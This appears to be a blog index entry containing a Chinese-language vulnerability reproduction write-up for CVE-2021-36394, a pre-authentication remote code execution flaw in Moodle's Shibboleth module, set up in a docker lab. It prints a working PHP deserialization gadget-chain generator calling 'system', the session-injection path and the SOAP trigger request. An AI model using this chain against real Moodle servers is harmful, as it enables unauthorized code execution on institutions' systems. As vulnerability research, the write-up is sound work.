<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Moodle_3.11_前台RCE_CVE-2021-36394</title>
    <link href="/2021/10/21/Moodle-3-11-%E5%89%8D%E5%8F%B0RCE-CVE-2021-36394/"/>
    <url>/2021/10/21/Moodle-3-11-%E5%89%8D%E5%8F%B0RCE-CVE-2021-36394/</url>
    
    <content type="html"><![CDATA[<p>本文首发于先知社区：<a href="https://xz.aliyun.com/t/10383">https://xz.aliyun.com/t/10383</a></p><p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p><code>Moodle</code> 是世界上最流行的学习管理系统。在几分钟内开始创建您的在线学习网站！</p><p><code>Moodle</code>的<code>Shibboleth</code>认证模块存在一个未授权远程代码执行漏洞。这在大学中被广泛使用，以允许来自一所大学的学生与其他大学进行身份验证，从而使他们能够参加外部课程并与其他人一起玩乐。</p><h2 id="0x01-漏洞影响"><a href="#0x01-漏洞影响" class="headerlink" title="0x01 漏洞影响"></a>0x01 漏洞影响</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span>.<span class="hljs-number">11</span>, <span class="hljs-number">3</span>.<span class="hljs-number">10</span> to <span class="hljs-number">3</span>.<span class="hljs-number">10</span>.<span class="hljs-number">4</span>, <span class="hljs-number">3</span>.<span class="hljs-number">9</span> to <span class="hljs-number">3</span>.<span class="hljs-number">9</span>.<span class="hljs-number">7</span> and earlier unsupported versions<br></code></pre></td></tr></table></figure><p>需要开启 <code>Shibboleth</code> 认证模块</p><p>可以 <code>fofa</code> 查看其使用，可以看到有 <code>13w</code> 条 <code>moodle</code> 应用</p><p><img src="0.png" alt="202210262318380.png"></p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>为了省去一些麻烦，这里我已经搭建好了漏洞 <code>docker</code>，可以在这里找到 <a href="https://github.com/N0puple/vulPOC/tree/main/Moodle/CVE-2021-36394%20Pre-Auth%20RCE%20in%20Moodle">CVE-2021-36394 Pre-Auth RCE in Moodle</a></p><p>执行如下操作</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose up -d</span><br></code></pre></td></tr></table></figure><p>然后进入 <code>docker</code> ，更改文件 <code>/var/www/html/moodle-3.11.0/config.php</code></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust">$CFG<span class="hljs-punctuation">-&gt;</span>wwwroot   = <span class="hljs-symbol">&#x27;http</span>:<span class="hljs-comment">//127.0.0.1&#x27;;</span><br></code></pre></td></tr></table></figure><p>将上面的链接改为自己的，必须是真实地址</p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><p>根据作者 <a href="https://haxolot.com/posts/2021/moodle_pre_auth_shibboleth_rce_part1/">博客</a> 上讲的，此漏洞大概可分为三部分，<code>session</code> 文件写入，<code>moodle</code> 反序列化链，反序列化执行入口</p><h3 id="moodle-反序列化链"><a href="#moodle-反序列化链" class="headerlink" title="moodle 反序列化链"></a>moodle 反序列化链</h3><p>先来看反序列化链，这并没有在 <code>PHPGGC</code> 收录，所以需要自己找，这里提供一条的简单分析，对细节感兴趣的童鞋可以调试一下</p><p>首先是 <code>__destruct</code> 入口，位于 <code>lib/classes/lock/lock.php</code></p><p><img src="1.png" alt="202210262318380.png"></p><p>可以看到 <code>$key</code> 可控，并且在字符串中，因此可以触发 <code>__toString</code></p><p>我们选择 <code>availability/classes/tree.php</code> 中的 <code>__toString</code> ，如图</p><p><img src="2.png" alt="202210262318380.png"></p><p><code>$this-&gt;children</code> 可控，因此可以对象遍历，我们可以选一个可以让我们命令执行的类，选择 <code>lib/classes/dml/recordset_walk.php</code> 的 <code>core\dml\recordset_walk</code> ，因为这里有一个 <code>current</code> 方法可以 <code>call_user_func</code> ，并且参数可控</p><p><img src="3.png" alt="202210262318380.png"></p><p><code>$this-&gt;callback</code> 可控，<code>$resord</code> 由 <code>$this-&gt;recordset-&gt;current()</code> 得到，我们可以看到 <code>$this-&gt;recordset</code>  ，需要实现的方法有很多，结合定义可以知道，<code>$this-&gt;recordset</code> 必须实现 <code>Iterator</code> ，因此范围就可以缩得比较小，最终确定使用 <code>question/engine/questionusage.php</code> 中的 <code>question_attempt_iterator</code> 类，但这个类默认没有被加载，需要一个类作为中介，这里可以选择 <code>question/classes/external.php</code> 中的  <code>core_question_external</code></p><p>如此即可得到反序列化链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">core</span>\<span class="hljs-title class_">lock</span> &#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">lock</span> &#123;<br>        <span class="hljs-title class_">public</span> <span class="hljs-title class_">function</span> <span class="hljs-title class_">__construct</span>($<span class="hljs-title class_">class</span>)<br>        &#123;<br>            $<span class="hljs-title class_">this</span>-&gt;<span class="hljs-title class_">key</span> = $<span class="hljs-title class_">class</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">core_availability</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">tree</span> &#123;<br>        <span class="hljs-title class_">public</span> <span class="hljs-title class_">function</span> <span class="hljs-title class_">__construct</span>($<span class="hljs-title class_">class</span>)<br>        &#123;<br>            $<span class="hljs-title class_">this</span>-&gt;<span class="hljs-title class_">children</span> = $<span class="hljs-title class_">class</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">core</span>\<span class="hljs-title class_">dml</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">recordset_walk</span> &#123;<br>        <span class="hljs-title class_">public</span> <span class="hljs-title class_">function</span> <span class="hljs-title class_">__construct</span>($<span class="hljs-title class_">class</span>)<br>        &#123;<br>            $<span class="hljs-title class_">this</span>-&gt;<span class="hljs-title class_">recordset</span> = $<span class="hljs-title class_">class</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;callbackextra = <span class="hljs-literal">null</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;callback = <span class="hljs-string">&quot;system&quot;</span>;<br><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">question_attempt_iterator</span>&#123;<br>        <span class="hljs-title class_">public</span> <span class="hljs-title class_">function</span> <span class="hljs-title class_">__construct</span>($<span class="hljs-title class_">class</span>)<br>        &#123;<br>            $<span class="hljs-title class_">this</span>-&gt;<span class="hljs-title class_">slots</span> = <span class="hljs-title class_">array</span>(<br>                &quot;<span class="hljs-title class_">xxx</span>&quot; =&gt; &quot;<span class="hljs-title class_">key</span>&quot;<br>            );<br>            <span class="hljs-variable language_">$this</span>-&gt;quba = <span class="hljs-variable">$class</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">question_usage_by_activity</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;questionattempts = <span class="hljs-keyword">array</span>(<br>                <span class="hljs-string">&quot;key&quot;</span> =&gt; <span class="hljs-string">&quot;whoami&quot;</span><br>            );<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">core_question_external</span></span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-variable">$add_lib</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">core_question_external</span>();<br>    <span class="hljs-variable">$activity</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">question_usage_by_activity</span>();<br>    <span class="hljs-variable">$iterator</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">question_attempt_iterator</span>(<span class="hljs-variable">$activity</span>);<br>    <span class="hljs-variable">$walk</span> = <span class="hljs-keyword">new</span> core\dml\<span class="hljs-title function_ invoke__">recordset_walk</span>(<span class="hljs-variable">$iterator</span>);<br>    <span class="hljs-variable">$tree</span> = <span class="hljs-keyword">new</span> core_availability\<span class="hljs-title function_ invoke__">tree</span>(<span class="hljs-variable">$walk</span>);<br>    <span class="hljs-variable">$lock</span> = <span class="hljs-keyword">new</span> core\lock\<span class="hljs-title function_ invoke__">lock</span>(<span class="hljs-variable">$tree</span>);<br><br>    <span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$add_lib</span>, <span class="hljs-variable">$lock</span>);<br>    <br>    <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>);<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$value</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="session-文件写入"><a href="#session-文件写入" class="headerlink" title="session 文件写入"></a>session 文件写入</h3><p>接下来我们要想办法将反序列化后的内容写入 <code>session</code> 文件</p><p>来到文件 <code>grade/report/grader/index.php</code> ，这是我们可以直接访问到的文件，来看看有什么处理</p><p><img src="202210262316088.PNG" alt="202210262318380.png"></p><p><code>required_param</code> 与 <code>option_param</code> 差不多，一个是必须，一个是可选，都是获取参数，这里可以看到 <code>id</code> 是必须的，且为 <code>int</code> 类型，其他的都是可选的，继续看下面的</p><p><img src="202210262316384.png" alt="202210262318380.png"></p><p>可以看到，<code>$graderreportsifirst</code> 与 <code>$graderreportsilast</code> 被写入了 <code>$SESSION</code> ，也就是上面的 <code>sifirst</code> 和 <code>silast</code>，而 <code>$SESSION</code> 是 <code>global</code> 修饰的，指向 <code>$GLOBALS[&#39;SESSION&#39;]</code> ，在 <code>lib/classes/session/manager.php</code> 中赋值</p><p><img src="202210262316167.png" alt="202210262318380.png"></p><p>默认 <code>session</code> 会存储在文件中，因此我们的反序列化 <code>payload</code> 就会被写入 <code>session</code> 的文件存储起来，但是存储进 <code>session</code> 文件的 <code>payload</code> 如何被成功反序列化呢？这就看最关键的下一部分</p><h3 id="反序列化执行入口"><a href="#反序列化执行入口" class="headerlink" title="反序列化执行入口"></a>反序列化执行入口</h3><p>反序列化执行的入口出在 <code>Shibboleth</code> 认证模块，需要管理者开启该认证模块才可以使用，默认是不开启的，因此降低了此漏洞的影响面，但全网存在的 <code>moodle</code> 系统实在是多，所以影响还是可以的。</p><p>来到 <code>auth/shibboleth/logout.php</code></p><p><img src="202210262317875.png" alt="202210262318380.png"></p><p>首先是获取了输入流赋值给 <code>$inputstream</code> ，当 <code>$inputstream</code> 不为空时，会使用 <code>soap</code> 来处理，<code>$server-&gt;handle()</code> 默认处理输入流中的数据， 构造如下 <code>xml</code> 数据流访问就可以访问到 <code>LogoutNotification</code> 函数</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span> <span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">LogoutNotification</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">spsessionid</span>&gt;</span>xxxx<span class="hljs-tag">&lt;/<span class="hljs-name">spsessionid</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">LogoutNotification</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="202210262318745.png" alt="202210262318380.png"></p><p>这里会先获取 <code>session</code> 存储的方式，文件存储与数据库存储，默认为文件存储，这时会进入 <code>\auth_shibboleth\helper::logout_file_session($spsessionid);</code></p><p><img src="202210262318274.png" alt="202210262318380.png"></p><p>这里获取了 <code>session</code> 存储的位置，然后遍历所有文件，获取内容，最后进入 <code>self::unserializesession($data[0]);</code></p><p><img src="202210262318380.png" alt="202210262318380.png"></p><p>这里首先以 <code>|</code> 分割字符串，然后以2个为一组，将每组的第二个反序列化，这里就解决了第二部分的问题，可以构造包含 <code>|</code> 与 <code>payload</code> 的字符串，就可以成功反序列化 <code>payload</code> ，构造如下</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">aaaaaa|<span class="hljs-params">...</span><span class="hljs-params">...</span>payload<span class="hljs-params">...</span><span class="hljs-params">...</span>|bbbbbb<br></code></pre></td></tr></table></figure><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h2><p>复现 <code>POC</code> 已上传 <code>github</code> <a href="https://github.com/N0puple/vulPOC/tree/main/Moodle/CVE-2021-36394%20Pre-Auth%20RCE%20in%20Moodle">传送门</a> ，需要注意的是，这个命令执行是无回显的，这里借助 <code>ceye</code> 平台进行测试</p><p>使用 <code>docker-compose.yml</code> 搭建环境</p><p>使用 <code>moodle_unserialize_rce.php</code> 生成反序列化字符串</p><p><img src="202210262318746.png" alt="image-20211017175905534.png"></p><p>使用 <code>moodle_rce.py</code> 进行测试</p><p><img src="202210262318747.png" alt="image-20211017180115851.png"></p><p>查看 <code>ceye</code> 平台</p><p><img src="202210262318748.png" alt="image-20211017180256269.png"></p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul><li><a href="https://haxolot.com/posts/2021/moodle_pre_auth_shibboleth_rce_part1/">https://haxolot.com/posts/2021/moodle_pre_auth_shibboleth_rce_part1&#x2F;</a></li><li><a href="https://github.com/dinhbaouit/CVE-2021-36394">https://github.com/dinhbaouit/CVE-2021-36394</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>PHP漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>PHP</tag>
      
      <tag>Moodle</tag>
      
      <tag>RCE</tag>
      
      <tag>未授权</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
